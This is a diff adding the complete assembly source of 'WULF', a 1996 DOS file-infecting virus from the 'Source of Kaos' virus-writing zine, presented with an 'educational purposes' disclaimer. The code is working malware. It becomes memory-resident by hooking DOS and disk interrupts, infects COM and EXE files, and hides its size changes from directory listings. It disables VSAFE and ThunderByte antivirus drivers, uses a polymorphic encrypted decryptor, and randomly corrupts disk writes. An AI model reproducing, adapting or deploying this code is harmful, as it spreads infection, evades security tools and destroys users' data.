@@ -1,0 +1,722 @@
+;
+;                          |- Source of Kaos -|
+;                          |-    Issue #2    -|
+;
+; Disclaimer:
+; This source code is provided educational purposes.  SOK takes no
+; responsiblity for how this source code is used.
+;
+;
+;================================================================
+;=                                                              =
+;=                       WULF                                   =
+;=                      ------                                  =
+;=                                                              =
+;=                                      February, 16th 1996     =
+;================================================================
+.model tiny                                             ;
+.code                                                   ;
+.stack                                                  ;
+                org     0eh                             ;
+                                                        ;
+        VirSize      =  (Vend - Vstart + 10h)/10h       ;
+        VirLength    =  (Vcrypted - Vstart + 10h)       ;
+        Marker       =  6 / 2                           ; files with 6 seconds
+                                                        ;
+                                                        ;
+WULF:           jmp     Venter + 2                      ;
+                                                        ;
+Vstart: ;===============================================;
+                                                        ;
+                db      Vcrypted - Crypted dup (0)      ; reserved for the decryptor
+                                                        ;
+;--- check install ---                                  ;
+Venter:         mov     sp,bp                           ;
+                in      al,21h                          ;
+                push    ax                              ;
+                mov     ax,33b3h                        ;
+                out     21h,al                          ; disable keyboard + clock
+                int     21h                             ;
+                                                        ;
+                cld                                     ;
+                call    Install                         ;
+                                                        ;
+;--- back to the host ---                               ;
+Host:           pop     ax                              ;
+                out     21h,al                          ; enable keyboard + clock
+                lea     si,[bp+Buffer-Host]             ;
+                mov     di,100h                         ;
+                call    Test_Exe                        ; are we attached to an exe ?
+                jne     Return_Com                      ; so, we are attached to a com file
+Return_Exe:     mov     ax,es                           ;
+                add     ax,10h                          ;
+                add     word ptr cs:[Jump+2],ax         ;
+                db      5                               ; add ax,xxxx
+        OldSS   dw      0                               ;
+                cli                                     ;
+                mov     ss,ax                           ;
+                db      0bch                            ; mov sp,xxxx
+        OldSP   dw      0                               ;
+                sti                                     ;
+                call    Clear_Reg                       ;
+                db      0eah                            ;
+        Jump    dd      0fff00000H                      ;
+                                                        ;
+;--- variables -----------------------------------------;
+ComJump         db      0e9h                            ; jump for com file infection
+Buffer          db      'MZ'                            ; marker for exe file
+                db      19h dup (0)                     ; also used for exe header
+w512            dw      512                             ; used to divide exe file's size
+Stealth_Flag    db      1                               ; Stealth ON / OFF
+Sav24           db      0                               ; first byte of int 24h handler
+;-------------------------------------------------------;
+                                                        ;
+Return_Com:     push    di                              ; di = 100h
+                movsw                                   ;
+                movsb                                   ;
+Clear_Reg:      xor     ax,ax                           ;
+                xor     bx,bx                           ;
+                xor     cx,cx                           ;
+                cwd                                     ; dx = 0
+                xor     di,di                           ;
+                xor     si,si                           ;
+                xor     bp,bp                           ;
+Bye:            ret                                     ;
+                                                        ;
+;*******************                                    ;
+;*  install virus  *------------------------------------;
+;*******************                                    ;
+install:        pop     bp                              ;
+                push    bp                              ;
+                jc      Bye                             ; already installed
+                                                        ;
+                push    ds es                           ; save es & ds
+                                                        ;
+                call    Kill_AV                         ; kill VSAFE & TBAV
+                                                        ;
+;--- disable int 1 & int 3 ---                          ;
+                mov     ax,52cfh                        ;
+                xor     si,si                           ;
+                mov     es,si                           ;
+                les     di,dword ptr es:[si+4]          ;
+                stosb                                   ;
+                mov     es,si                           ;
+                les     di,dword ptr es:[si+0ch]        ;
+                stosb                                   ;
+                                                        ;
+;--- allocate memory ---                                ;
+                mov     di,3                            ;
+                int     21h                             ; ah = 52h
+                mov     dx,es                           ; later used to find DOS entry
+                mov     ds,es:[bx-2]                    ;
+Check_MCB:      cmp     byte ptr ds:[si],'M'            ;
+                je      Next_MCB                        ;
+                cmp     byte ptr ds:[si],'Z'            ;
+                jne     Get_MCB                         ;
+                cmp     word ptr ds:[di],VirSize+1      ; too small MCB ?
+                jbe     Back_Host                       ;
+                mov     byte ptr ds:[si],'M'            ;
+                sub     word ptr ds:[di],VirSize+1      ;
+Next_MCB:       mov     ax,ds                           ;
+                add     ax,ds:[di]                      ;
+                inc     ax                              ;
+                mov     ds,ax                           ;
+                jmp     Check_MCB                       ;
+Get_MCB:        mov     byte ptr ds:[si],'Z'            ;
+                mov     word ptr ds:[si+1],8            ; we are part of DOS system now
+                mov     word ptr ds:[di],VirSize        ;
+                push    ds                              ;
+                pop     es                              ;
+                                                        ;
+;--- move in memory ---                                 ;
+                push    cs                              ;
+                pop     ds                              ;
+                lea     di,Vstart                       ;
+                lea     si,[bp+Vstart-Host]             ;
+                mov     cx,Vcrypted - Vstart            ;
+        rep     movsb                                   ;
+                                                        ;
+                mov     ds,cx                           ; ds = 0
+                                                        ;
+;--- save initial int 13 address ---                    ;
+                cli                                     ;
+                mov     si,4ch                          ; 0000:004C (int 13)
+                lea     di,Sav13                        ;
+                lea     ax,Int13                        ;
+                call    Hook                            ;
+                                                        ;
+;--- save initial int 21 address ---                    ;
+                mov     si,84h                          ; 0000:0084 (int 21)
+                push    si                              ;
+                lea     di,Sav21                        ;
+                movsw                                   ;
+                movsw                                   ;
+                pop     si                              ;
+                lea     di,Real21                       ;
+                lea     ax,Int21                        ;
+                call    Hook                            ;
+                                                        ;
+;--- look for original dos entry ---                    ;
+                mov     ds,dx                           ; ds = segment returned by dos function 52h
+                mov     si,109eh                        ;
+                lodsw                                   ;
+                cmp     ax,9090h                        ;
+                jne     Back_Host                       ;
+                lodsb                                   ;
+                cmp     al,0e8h                         ;
+                jne     Back_Host                       ;
+                mov     word ptr es:Real21,10a0h        ;
+                mov     word ptr es:Real21+2,ds         ;
+                                                        ;
+Back_Host:      sti                                     ;
+                pop     es ds                           ;
+                ret                                     ;
+                                                        ;
+;--- hook int vectors ---                               ;
+Hook:           movsw                                   ;
+                movsw                                   ;
+                mov     word ptr [si-4],ax              ;
+                mov     word ptr [si-2],es              ;
+                ret                                     ;
+                                                        ;
+;-------------------------------------------------------;
+;=== Kill VSAVE & TBAV ===                              ;
+                                                        ;
+        Tbname  db      'TBMEMXXX','TBCHKXXX'           ; thunderbyte's drivers
+                db      'TBDSKXXX','TBFILXXX'           ;
+                                                        ;
+Kill_AV:        push    ax bx cx dx di ds es            ;
+                mov     ah,0ffh                         ;
+                xor     bl,bl                           ;
+                int     13h                             ;
+                mov     ah,0feh                         ;
+                int     13h                             ;
+;--- kill VSAFE ---                                     ;
+                mov     ax,0fa02h                       ;
+                mov     dx,5945h                        ;
+                mov     bl,31h                          ;
+                int     16h                             ;
+;--- kill TBAV ---                                      ;
+                push    cs                              ;
+                pop     ds                              ;
+                mov     ah,52h                          ;
+                int     21h                             ;
+                les     bx,es:[bx+22h]                  ;
+Search_Device:  lea     si,[bp + Tbname - 8 - Host]     ;
+                mov     cx,4                            ;
+Search_Utility: push    cx                              ;
+                add     si,8                            ;
+                lea     di,[bx+0ah]                     ;
+                mov     cl,4                            ;
+                push    si                              ;
+        repe    cmpsw                                   ;
+                pop     si cx                           ;
+                loopne  Search_Utility                  ;
+                jne     Next_Device                     ;
+                or      byte ptr es:[16h],1             ; eliminates TB utility
+Next_Device:    les     bx,es:[bx]                      ;
+                cmp     bx,-1                           ;
+                jne     Search_Device                   ;
+                pop     es ds di dx cx bx ax            ;
+                ret                                     ;
+;___________________________________________________________________________
+;
+;               NEW  INT 13H  HANDLER
+;___________________________________________________________________________
+Int13:          pushf                                   ;
+                cli                                     ;
+                cmp     ah,3                            ;
+                jmp     Jump13  ;<=====                 ;
+                push    di es                           ;
+                xor     di,di                           ;
+                mov     es,di                           ;
+                mov     di,word ptr es:[46ch]           ; random value
+                and     di,1023                         ; 1/1024 chance to perform damage
+                pop     es di                           ;
+                jz      Alter                           ;
+Jump13:         popf                                    ;
+                db      0eah                            ;
+        Sav13   dd      0                               ;
+                                                        ;
+Alter:          inc     word ptr [bx+si]                ;
+                popf                                    ;
+                pushf                                   ; do the write
+                call    dword ptr cs:Sav13              ; but do the wrong
+                pushf                                   ;
+                dec     word ptr [bx+si]                ;
+                jmp     Popf_Retf2                      ;
+                                                        ;
+;--- Signature -----------------------------------------;
+VirusName       db      "[WULF]",0                      ;
+VirusDad        db      "(c) 1995-1996 WereWolf",0      ;
+;-------------------------------------------------------;
+;___________________________________________________________________________
+;
+;               NEW  INT 21H  HANDLER
+;___________________________________________________________________________
+Int21:          sti                                     ;
+                cmp     ax,33b3h                        ; self-check install ?
+                jne     Intercept0                      ;
+                stc                                     ;
+                jmp     Retf2                           ;
+                                                        ;
+Intercept0:     push    ax                              ; save ax
+                xor     ah,11h                          ; ah=11h find first FCB
+                jz      Stealth                         ;
+                xor     ah,3                            ; ah=12h find next  FCB
+                jz      Stealth                         ;
+                xor     ah,5ch                          ; ah=4eh find first Handle
+                jz      Stealth                         ;
+                xor     ah,1                            ; ah=4fh find next Handle
+                jnz     Intercept1                      ;
+                                                        ;
+Stealth:        pop     ax                              ;
+                mov     byte ptr cs:Buffer,ah           ; save ah
+                call    i21                             ;
+                jc      Retf2                           ;
+                pushf                                   ;
+                cmp     byte ptr cs:Stealth_Flag,0      ; Stealth ON ?
+                jz      Popf_Retf2                      ;
+                push    ax bx si di ds es               ;
+                mov     ah,2fh                          ;
+                call    i21                             ;
+                push    es                              ;
+                pop     ds                              ;
+                mov     di,16h                          ;
+                mov     si,1ah                          ;
+                cmp     byte ptr cs:Buffer,12h          ;
+                ja      S1                              ;
+                inc     di                              ; di = 0017h
+                mov     si,1dh                          ;
+                cmp     byte ptr ds:[bx],0ffh           ; is it a large FCB ?
+                jne     S0                              ;
+                add     bx,7                            ; yes, so translate
+S0:             cmp     word ptr ds:[bx+9],'XE'         ;
+                je      S1                              ;
+                cmp     word ptr ds:[bx+9],'OC'         ;
+                jne     Return_Stealth                  ;
+S1:             mov     ax,ds:[bx+di]                   ; ax = file time
+                and     al,1fh                          ; show seconds
+                cmp     al,Marker                       ;
+                jne     Return_Stealth                  ; not infected
+                les     ax,dword ptr ds:[bx+si]         ;
+                mov     di,es                           ;
+                sub     ax,VirLength                    ;
+                sbb     di,0                            ;
+                jc      Return_Stealth                  ; too small to have been infected
+S2:             mov     ds:[bx+si],ax                   ;
+                mov     ds:[bx+si+2],di                 ;
+Return_Stealth: pop     es ds di si bx ax               ;
+Popf_Retf2:     popf                                    ;
+Retf2:          retf    2                               ;
+                                                        ;
+Intercept1:     xor     ah,4                            ; ah=4bh program execution
+                jz      Execution                       ;
+                xor     ah,7                            ; ah=4ch end program
+                jz      Stealth_ON                      ;
+                xor     ah,7dh                          ; ah=31h tsr function
+                jnz     J21                             ;
+                push    bp                              ;
+                lea     bp,Host                         ;
+                call    Kill_AV                         ; kill VSAFE & TBAV
+                pop     bp                              ;
+Stealth_ON:     mov     byte ptr cs:Stealth_Flag,1      ; Stealth On
+J21:            jmp     Jump21                          ;
+                                                        ;
+Execution:      cmp     al,1                            ; we don't want special
+                ja      J21                             ; exec functions
+                push    bx cx bp si di es dx ds         ;
+                xor     bp,bp                           ;
+;--- disable keyboard & timer ---                       ;
+                in      al,21h                          ;
+                or      al,3                            ;
+                out     21h,al                          ;
+;--- inactive int 3h & int 24h---                       ;
+                mov     al,0cfh                         ; CF = code for IRET
+                mov     es,bp                           ; es = 0
+                les     di,dword ptr es:[bx+0ch]        ;
+                stosb                                   ;
+                mov     es,bp                           ; es = 0
+                les     di,dword ptr es:[90h]           ;
+                xchg    byte ptr es:[di],al             ;
+                mov     byte ptr cs:Sav24,al            ;
+                                                        ;
+;--- get attribute ---                                  ;
+                mov     ax,4300h                        ; ax = 4300h
+                call    DOS                             ;
+                push    cx                              ; save attribute
+;--- point file name ---                                ;
+                mov     si,dx                           ; ds:si points to file's name
+                cld                                     ;
+Scan_Fname1:    lodsb                                   ;
+                or      al,al                           ;
+                jnz     Scan_Fname1                     ;
+Scan_Fname2:    dec     si                              ;
+                cmp     byte ptr [si-1],'\'             ;
+                je      Check_Fname0                    ;
+                cmp     byte ptr [si-1],'/'             ;
+                jne     Scan_Fname2                     ;
+                                                        ;
+;--- check for unfriendly programs ---                  ;
+Check_Fname0:   push    cs                              ;
+                pop     es                              ;
+                xor     cx,cx                           ;
+                lea     di,ProgList                     ;
+Check_Fname1:   mov     cl,byte ptr cs:[di]             ;
+                jcxz    Open_File                       ; end of list ?
+                inc     di                              ;
+                mov     ax,di                           ;
+                add     ax,cx                           ;
+                push    ax si                           ;
+Check_Fname2:   lodsb                                   ;
+                cmp     al,'a'                          ;
+                jb      Check_Fname3                    ;
+                cmp     al,'z'                          ;
+                ja      Check_Fname3                    ;
+                sub     al,('a'-'A')                    ; convert 'a' to 'A', 'b' to 'B' etc ...
+Check_Fname3:   scasb                                   ;
+                loope   Check_Fname2                    ;
+                pop     si di                           ;
+                jne     Check_Fname1                    ;
+                cmp     di,offset EndProgList           ;
+                jb      JRestore_2                      ;
+Stealth_OFF:    mov     byte ptr cs:Stealth_Flag,0      ; Stealth OFF for F-PROT & CHKDSK
+                je      Open_File                       ; if di=EndProgList then ds:si='CHKDS'
+JRestore_2:     jmp     Restore_2                       ; else ds:si='F-'
+                                                        ;
+Open_file:                                              ;
+;--- set r/w access ---                                 ; cx = 0 after Check_Fname routine
+                mov     ax,4301h                        ; ax = 4301h
+                call    DOS                             ;
+                jc      JRestore_2                      ;
+;--- r/w open file ---                                  ;
+                mov     ax,3d02h                        ;
+                call    i21                             ;
+                jc      JRestore_2                      ;
+                xchg    bx,ax                           ;
+                push    cs                              ;
+                pop     ds                              ; ds = cs
+;--- read file ---                                      ;
+                lea     dx,Buffer                       ;
+                mov     si,dx                           ;
+                mov     cx,1bh                          ;
+                mov     ah,3fh                          ;
+                call    i21                             ;
+                jc      Restore_1                       ;
+;--- read date & time ---                               ;
+                mov     ax,5700h                        ;
+                call    DOS                             ;
+                jc      Restore_1                       ;
+;--- test file for infection ---                        ;
+                mov     ax,cx                           ;
+                and     al,1fh                          ;
+                cmp     al,Marker                       ;
+                je      Restore_1                       ;
+;--- test if valid exe ---                              ;
+                call    Test_Exe                        ; is it an exe file ?
+                je      Exe_File                        ;
+                push    cx dx                           ; save Time & Date
+                call    Infect_Com                      ;
+                jmp     Restore                         ;
+Exe_File:       cmp     byte ptr [si+18h],40h           ; No new exe header (windows)
+                je      Restore_1                       ;
+                cmp     byte ptr [si+1ah],0             ; No overlays
+                jne     Restore_1                       ;
+                push    cx dx                           ; save Time & Date
+                call    Infect_Exe                      ;
+Restore:        pop     dx cx                           ; restore Time & Date
+                jc      Restore_0                       ; any problem occured ?
+                                                        ;
+;--- mark the file ---                                  ;
+                and     cx,0ffe0h                       ;
+                or      cl,Marker                       ;
+                                                        ;
+;--- restore date & time ---                            ;
+Restore_0:      mov     ax,5701h                        ;
+                call    DOS                             ;
+Restore_1:      mov     ah,3eh                          ; close file
+                call    i21                             ;
+Restore_2:      pop     cx ds dx                        ; restore attribute
+                mov     ax,4301h                        ;
+                call    DOS                             ;
+                                                        ;
+;--- restore int 24h ---                                ;
+Rest_Int24:     mov     al,byte ptr cs:Sav24            ;
+                mov     es,bp                           ;
+                les     di,dword ptr es:[90h]           ;
+                mov     byte ptr es:[di],al             ;
+;--- enable keyboard & timer ---                        ;
+                in      al,21h                          ;
+                and     al,0fch                         ;
+                out     21h,al                          ;
+                pop     es di si bp cx bx               ; restore registers
+Jump21:         pop     ax                              ;
+                cli                                     ;
+                jmp     dword ptr cs:Sav21              ; jump to int 21h
+                                                        ;
+;--- test if EXE ---                                    ;
+Test_Exe:       cmp     word ptr cs:[si],'ZM'           ; look for 'MZ'
+                je      Test_End                        ;
+                cmp     word ptr cs:[si],'MZ'           ; look for 'ZM'
+Test_End:       ret                                     ;
+                                                        ;
+;--- MUTATION ENGINE -----------------------------------;
+Mxchg0:         cli                                     ;
+                mov     bp,sp                           ;
+Mxchg1:         cli                                     ;
+                xchg    sp,bp                           ;
+Mxchg2:         cli                                     ;
+                xchg    bp,sp                           ;
+                cli                                     ;
+                                                        ;
+        Random1 dw      0                               ;
+        Random2 dw      0                               ;
+                                                        ;
+Infect:         push    bx si dx ax                     ;
+;--- get random values ---                              ;
+GetKey:         xor     dx,dx                           ;
+                mov     es,dx                           ;
+                les     dx,es:[46ch]                    ; bios timer
+;--- mutate decryptor ---                               ;
+Mut0:           mov     cx,es                           ;
+                add     ax,cx                           ;
+                add     ax,dx                           ;
+                mov     word ptr Random1,dx             ; save random values
+                mov     word ptr Random2,ax             ;
+                push    cs                              ;
+                pop     es                              ; es = ds = cs
+                lea     di,Crypted                      ;
+                and     ax,1                            ;
+                cmp     dh,80h                          ; *****
+                ja      Mut1                            ;
+                inc     ax                              ;
+Mut1:           mov     si,ax                           ;
+                add     si,si                           ;
+                add     si,ax                           ; si = 3 * ax
+                lea     si,[si+Mxchg0]                  ;
+                cmp     dh,dl                           ; *****
+                jb      Mut2                            ;
+                inc     si                              ;
+Mut2:           movsw                                   ; xchg bp,sp (or mov bp,sp etc ...)
+                movsb                                   ; cli
+                inc     di                              ; jump the mov sp,
+                pop     ax                              ;
+                stosw                                   ; InitSP
+                add     al,dl                           ;
+                adc     ah,0                            ;
+                add     ax,Vcrypted - Venter + 1        ;
+                mov     word ptr EndSP,ax               ; EndSP
+                                                        ;               
+                and     dx,7                            ;
+                mov     ax,dx                           ;
+                add     ax,0d0c0h                       ;
+                xchg    ah,al                           ; rol byte,1
+                mov     cx,ax                           ;
+                and     ch,4                            ; rol a.,1
+                add     ch,0c0h                         ;
+                mov     bx,8                            ;
+                cmp     byte ptr Random2 + 1,80h        ; *****
+                jb      Mut3                            ;
+                xchg    bh,bl                           ;
+Mut3:           add     ah,bh                           ;
+                add     ch,bl                           ;
+                mov     word ptr Func2,cx               ;
+                mov     bx,dx                           ;
+                and     bl,3                            ;
+                add     bl,58h                          ;
+                xchg    bx,ax                           ;
+                stosb                                   ; pop
+                sub     al,8                            ;
+                push    ax                              ; save associated push
+                xchg    bx,ax                           ;
+                stosw                                   ; rol or ror
+                and     dx,3                            ;
+                mov     ax,dx                           ;
+                add     ax,ax                           ;
+                add     ax,ax                           ;
+                add     ax,ax                           ;
+                add     ax,dx                           ; ax = 9 * dx
+                mov     cx,0c432h                       ; xor al,ah
+                xchg    ah,al                           ;
+                add     ax,cx                           ; xor .l,.h
+                cmp     byte ptr Random1,80h            ; *****
+                jb      Mut4                            ;
+                add     ah,1ch                          ;
+                add     ch,1ch                          ;
+Mut4:           mov     word ptr Func1,cx               ; xor ah,al or xor al,ah
+                stosw                                   ; xor .h,.l or xor .l,.h
+                pop     ax                              ;
+                stosb                                   ;
+                mov     bx,word ptr Random2             ; *****
+                push    bx                              ;
+                cmp     bh,bl                           ;
+                jb      Mut5                            ;
+                mov     ax,word ptr Func1               ;
+                xchg    ax,word ptr Func2               ;
+                mov     word ptr Func1,ax               ;
+                mov     ax,word ptr F1                  ;
+                xchg    ax,word ptr F2                  ;
+                mov     word ptr F1,ax                  ;
+                                                        ;
+Mut5:           and     bx,7                            ;
+                cmp     bl,4                            ; no pop sp !
+                je      Mut6                            ;
+                cmp     bl,5                            ; no pop bp !
+                jne     Mut7                            ;
+Mut6:           inc     bx                              ;
+                inc     bx                              ;
+Mut7:           mov     ax,bx                           ;
+                add     ax,4c58h                        ; dec sp + pop ..
+                pop     bx                              ;
+                and     bh,1                            ;
+                jz      Mut8                            ;
+                xchg    ah,al                           ; dec sp <-> pop ..
+Mut8:           stosw                                   ;
+                add     di,4                            ;
+                mov     al,72h                          ; jb
+                cmp     bl,80h                          ; ****
+                jb      Mut9                            ;
+                mov     al,76h                          ; jbe
+Mut9:           stosb                                   ;
+                                                        ;
+;--- encrypt virus ---                                  ;
+Encrypt:        mov     si,di                           ; di = Vcrypted - 1
+                mov     cx,Vcrypted - Venter            ;
+                add     di,cx                           ;
+                std                                     ;
+                lodsb                                   ;
+                inc     si                              ;
+E0:             xchg    ah,al                           ;
+                lodsb                                   ;
+        Func1   dw      0                               ;
+        Func2   dw      0                               ;
+                stosw                                   ;
+                inc     di                              ;
+                loop    E0                              ;
+                cld                                     ;
+                                                        ;
+;--- write encrypted code ---                           ;
+                pop     di                              ;
+                lea     dx,[Crypted-10h-di]             ;
+                mov     cx,VirLength                    ;
+                pop     si bx                           ;
+                jmp     Write_File                      ;
+                                                        ;
+;--- EXE infection -------------------------------------;
+Infect_Exe:     les     ax,dword ptr [si+14h]           ; save old CS:IP
+                mov     word ptr [Jump],ax              ;
+                mov     word ptr [Jump+2],es            ;
+                les     ax,dword ptr [si+0eh]           ; save old SS:SP
+                mov     word ptr OldSP,es               ;
+                mov     word ptr OldSS,ax               ;
+                mov     al,2                            ; move pointer to
+                call    Move_ptr                        ; the end of file
+                push    ax dx                           ; save file size
+                xchg    di,ax                           ;
+                mov     cx,dx                           ;
+                mov     ax,word ptr [si+4]              ;
+                dec     ax                              ;
+                mul     w512                            ;
+                add     ax,word ptr [si+2]              ;
+                adc     dx,bp                           ;
+                sub     ax,di                           ;
+                sbb     dx,cx                           ;
+                pop     dx ax                           ;
+                jc      Return                          ; internal overlays detected
+                push    ax dx                           ;
+                mov     di,[si+8]                       ; header size in paragraphs
+                mov     cl,4                            ;
+                shl     di,cl                           ; multiply by 16
+                sub     ax,di                           ; header size - file size
+                sbb     dx,bp                           ; now DX:AX=file size - header size
+                mov     cx,10h                          ; DX:AX/CX=AX remainder DX
+                div     cx                              ;
+                mov     [si+14h],cx                     ; IP offset
+                mov     [si+16h],ax                     ; CS displacement in module
+                inc     ax                              ;
+                mov     [si+0eh],ax                     ; SS displacement
+                mov     byte ptr [si+11h],cl            ; starting SP
+                                                        ;
+                mov     ax,Vcrypted - Crypted           ;
+                call    Infect                          ;
+                pop     dx ax                           ; restore file size
+                jc      Return                          ;
+                                                        ;
+                add     ax,cx                           ; cx = Vend - Vstart + 10h
+                adc     dx,bp                           ;
+                div     w512                            ;
+                or      dx,dx                           ;
+                jz      End_Infect                      ;
+                inc     ax                              ;
+End_Infect:     mov     [si+2],dx                       ; number of 512 pages
+                mov     [si+4],ax                       ; number of bytes in last page
+                xor     ax,ax                           ; move pointer
+                call    Move_Ptr                        ; to the bigining of the file
+                mov     dx,si                           ; write new header
+                mov     cl,18h                          ;
+Write_File:     mov     ah,40h                          ;
+;--- Real int 21h call ---                              ;
+i21:            pushf                                   ;
+                db      9ah                             ;
+        Real21  dd      0                               ;
+Return:         ret                                     ;
+                                                        ;
+;--- Move file pointer ---                              ;
+Move_Ptr:       mov     ah,42h                          ;
+                cwd                                     ;
+                xor     cx,cx                           ;
+;--- Normal int 21h call ---                            ;
+DOS:            pushf                                   ;
+                db      9ah                             ;
+        Sav21   dd      0                               ;
+                ret                                     ;
+                                                        ;
+;--- Unfriendly programs -------------------------------;
+ProgList        db      5,'CLEAN',3,'AVP',2,'TB',1,'V'  ;
+                db      4,'SCAN',3,'NAV',3,'IBM'        ;
+                db      5,'FINDV',5,'GUARD',2,'FV'      ;
+                db      6,'CHKDSK'                      ;
+EndProgList     db      2,'F-',0                        ;
+                                                        ;
+;--- COM Infection -------------------------------------;
+Infect_Com:     mov     al,2                            ; move pointer to the
+                call    Move_ptr                        ; end of file
+                or      dx,dx                           ; size > 64k ?
+                stc                                     ;
+                jnz     Return                          ;
+                cmp     ax,65000 - VirLength            ;
+                ja      Return                          ; Not too big
+                sub     ax,3                            ;
+                jc      Return                          ; but not too small
+                push    ax                              ; save file size
+                                                        ;
+                add     ax,Vcrypted - Crypted + 103h    ;
+                mov     dl,10h                          ;
+                call    Infect                          ;
+                pop     word ptr ds:[si]                ; set jump address
+                jc      Return                          ;
+                                                        ;
+                xor     ax,ax                           ; move pointer to the
+                call    Move_Ptr                        ; bigining of the file
+                mov     dl,ComJump - Vstart + 10h       ; dx = offset ComJump
+                mov     cl,3                            ;
+                jmp     Write_File                      ; write jump
+;-------------------------------------------------------;
+Crypted:        cli                                     ; decryptor
+                mov     bp,sp                           ;
+                db      0bch                            ; mov sp,xxxx
+        InitSP  dw      0                               ;
+M0:             pop     ax                              ;
+        F1      dw      0                               ;
+        F2      dw      0                               ;
+                push    ax                              ;
+                pop     bx                              ;
+                dec     sp                              ;
+                dw      0fc81h                          ; cmp sp,xxxx
+        EndSP   dw      0                               ;
+                jb      M0                              ;
+                                                        ;
+Vcrypted        db      Vcrypted - Venter dup (0)       ; crypted form
+                                                        ;
+Vend:   ;===============================================;
+                end     WULF                            ;
